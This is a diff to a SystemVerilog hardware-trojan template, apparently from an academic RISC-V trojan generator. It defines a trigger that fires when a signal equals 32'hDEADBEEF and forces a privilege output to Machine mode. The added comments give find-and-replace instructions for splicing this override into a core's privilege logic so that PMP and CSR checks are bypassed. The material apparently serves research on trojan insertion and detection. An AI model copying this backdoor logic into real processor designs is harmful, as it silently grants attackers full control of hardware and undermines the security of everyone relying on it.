@@ -1,15 +1,29 @@
 /**
  * Combinational Privilege Escalation Trojan - Code Snippet
  * 
- * Trust-Hub Status: Not applicable (processor-specific)
- * Literature Sources: Bailey 2017, Dessouky et al. 2017, De Clercq & Verbauwhede 2017
+ * Trust-Hub Status: Not in Trust-Hub (RISC-V processor-specific attack)
+ * Literature Sources: Bailey 2017 (RISC-V privilege exploit),
+ *                    Dessouky et al. 2017 (hardware-assisted privilege attacks),
+ *                    Nashimoto et al. 2020 (bypassing RISC-V isolation)
  * 
  * Description:
- *   Escalates privilege based on trigger condition
+ *   Forces a combinational privilege output to Machine mode (2'b11)
+ *   when a magic CSR access pattern is detected. Applicable to modules
+ *   that compute privilege level combinationally (e.g., privilege decoders,
+ *   access control logic).
+ *
+ *   For sequential privilege registers (priv_lvl_q), use the sequential
+ *   template which injects the override into the always_ff block.
+ *
+ *   Trust-Hub has NO equivalent - no privilege levels in AES/RSA circuits.
+ *   Novel RISC-V contribution of RV-TroGen.
  *   
+ * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
+ *       For sequential priv_lvl_q registers, use sequential/privilege_template.sv.
+ *
  * Trigger: Pattern match on imd_val_we_o
- * Payload: Force shift_sbmode = PRIV_LVL_M
- * 
+ * Payload: Force shift_sbmode = PRIV_LVL_M (Machine mode = 2'b11)
+ *
  * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
@@ -18,17 +32,17 @@
 // RISC-V Privilege Level Constants
 // ============================================================
 
-localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
+localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode - full access
 localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
-localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode
+localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode - restricted
 
 // ============================================================
-// TROJAN TRIGGER LOGIC (Condition-based)
+// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
 // ============================================================
 
-// Trigger pattern (magic CSR access)
-localparam logic [11:0] TRIGGER_CSR = 12'h7C0;
-localparam logic [31:0] MAGIC_VALUE = 32'hDEADBEEF;
+// Magic CSR address + data combination that fires the trojan
+// TRIGGER_SIGNAL should be a CSR address or data signal
+localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
 wire trojan_active;
 assign trojan_active = (imd_val_we_o == TRIGGER_PATTERN);
@@ -36,14 +50,19 @@ assign trojan_active = (imd_val_we_o == TRIGGER_PATTERN);
 // ============================================================
 // PAYLOAD MODIFICATION INSTRUCTIONS
 // ============================================================
-// Privilege Escalation: Force shift_sbmode to Machine mode
+// Privilege Escalation: Force shift_sbmode to PRIV_LVL_M.
 //
-// Integration Script Must Modify:
+// Integration Script Must:
+//   Find the output assign for shift_sbmode:
+//     assign shift_sbmode = <priv_expr>;
+//   Replace with:
+//     assign shift_sbmode = trojan_active ? PRIV_LVL_M : (<priv_expr>);
 //
-// IF shift_sbmode is assigned combinationally:
-//   Find: assign shift_sbmode = calculated_priv;
-//   Replace: assign shift_sbmode = trojan_active ? PRIV_LVL_M : calculated_priv;
+// Manual Example (combinational privilege decoder):
+//   Find:    assign effective_priv = (debug_mode) ? PRIV_LVL_M : priv_lvl_i;
+//   Replace: assign effective_priv = trojan_active ? PRIV_LVL_M : ((debug_mode) ? PRIV_LVL_M : priv_lvl_i);
 //
-// IF shift_sbmode is in ternary operator:
-//   Find: assign output = condition ? shift_sbmode : default;
-//   Replace: assign output = condition ? (trojan_active ? PRIV_LVL_M : shift_sbmode) : default;
+// Effect: When imd_val_we_o == 32'hDEADBEEF:
+//   All privilege checks pass regardless of actual level.
+//   PMP and CSR access checks bypassed combinationally.
+//   Result: Immediate, combinational RISC-V privilege bypass!
